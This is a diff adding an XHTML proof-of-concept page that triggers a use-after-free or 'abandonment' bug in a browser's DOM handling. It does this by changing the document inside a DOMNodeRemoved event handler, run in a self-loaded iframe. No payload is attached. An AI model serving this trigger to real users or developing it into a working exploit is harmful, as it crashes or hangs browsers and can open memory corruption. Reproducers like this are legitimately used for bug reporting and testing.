@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<script><![CDATA[
+  // Choose what bug you want to trigger. If both are set, abandonment will be
+  // triggered. If neither is set, no bug will be triggered.
+  var bTriggerUseAfterFree = true,
+      bTriggerAbandonment = false;
+  if (window === top) {
+    document.documentElement.appendChild(document.createElement("iframe")).src = "?";
+  } else {
+    var uEventCounter = 0;
+    document.addEventListener("DOMNodeRemoved",function(oEvent) {
+      if (bTriggerAbandonment || ++uEventCounter == 2)  {
+        document.documentElement.textContent = "x";
+      } else if (bTriggerUseAfterFree) {
+        document.documentElement.offsetTop;
+      };
+    }, true);
+    onload = function() {
+      do {
+        document.documentElement.textContent = "";
+      } while (bTriggerAbandonment);
+    };
+  };
+]]></script>
